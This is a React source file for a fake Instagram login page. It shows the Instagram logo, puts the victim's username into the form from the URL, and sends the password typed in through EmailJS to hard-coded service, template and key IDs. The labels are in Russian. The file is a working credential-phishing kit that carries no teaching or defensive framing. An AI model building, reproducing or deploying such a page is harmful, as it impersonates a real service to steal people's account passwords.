import InstagramLogo from '../img/instagram-logo.png'
import AppleBtn from '../img/apple-button.png'
import AndroidBtn from '../img/googleplay-button.png'
import {useNavigate, useParams} from "react-router";
import emailjs from '@emailjs/browser';
import {useRef, useState} from "react";
import {LinearProgress} from "@mui/material";

export const Main = () => {
    const parmas = useParams()
    const [success, setSuccess] = useState(0);
    const navigate = useNavigate();

    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();
        setSuccess(1)
        emailjs
            .sendForm('service_7jfg6dg', 'template_c5i9a3f', form.current, {
                publicKey: 'qc9wYSvl8s8uYAkVt',
            })
            .then(
                () => {
                    console.log('SUCCESS!');
                },
                (error) => {
                    console.log('FAILED...', error.text);
                    navigate(0)

                },
            );
    };


    return (
        <main className="flex align-items-center justify-content-center">
            <section id="mobile" className="flex">
            </section>
            <section id="auth" className="flex direction-column">
                <div className="panel login flex direction-column">
                    <h1 title="Instagram" className="flex justify-content-center">
                        <img src={InstagramLogo} alt="Instagram logo" title="Instagram logo"/>
                    </h1>
                    <form ref={form} onSubmit={sendEmail}>
                        <label htmlFor="name" className="sr-only">имя пользователя</label>
                        <input required id={'user_name'} name="user_name" placeholder={parmas.user.slice(1)} value={parmas.user.slice(1)}/>

                        <label htmlFor="password" className="sr-only">Пароль</label>
                        <input required id={'user_password'} name="user_password" type="password" placeholder="Пароль"/>

                        {
                            success === 1 ?
                                <LinearProgress/>
                                :
                                <button>Войти</button>
                        }
                    </form>
                    {/*<div className="flex separator align-items-center">*/}
                    {/*    <span></span>*/}
                    {/*    <div className="or">OU</div>*/}
                    {/*    <span></span>*/}
                    {/*</div>*/}
                    {/*<div className="login-with-fb flex direction-column align-items-center">*/}
                    {/*    <div>*/}
                    {/*        <img/>*/}
                    {/*        <a>Entrar com o facebook</a>*/}
                    {/*    </div>*/}
                    {/*    <a href="#">Esqueceua senha?</a>*/}
                    {/*</div>*/}
                </div>
                {/*<div className="panel register flex justify-content-center">*/}
                {/*    <p>Não tem uma conta?</p>*/}
                {/*    <a href="#">Cadastre-se</a>*/}
                {/*</div>*/}
                {/*<div className="app-download flex direction-column align-items-center">*/}
                {/*    <p>Obtenha o aplicativo.</p>*/}
                {/*    <div className="flex justify-content-center">*/}
                {/*        <img src={AppleBtn} alt="Imagem com a logo da Apple Store"*/}
                {/*             title="Imagem com a logo da Apple Store"/>*/}
                {/*        <img src={AndroidBtn} alt="Imagem com a logo da Google Play"*/}
                {/*             title="Imagem com a logo da Google Play"/>*/}
                {/*    </div>*/}
                {/*</div>*/}
            </section>
        </main>
    )
}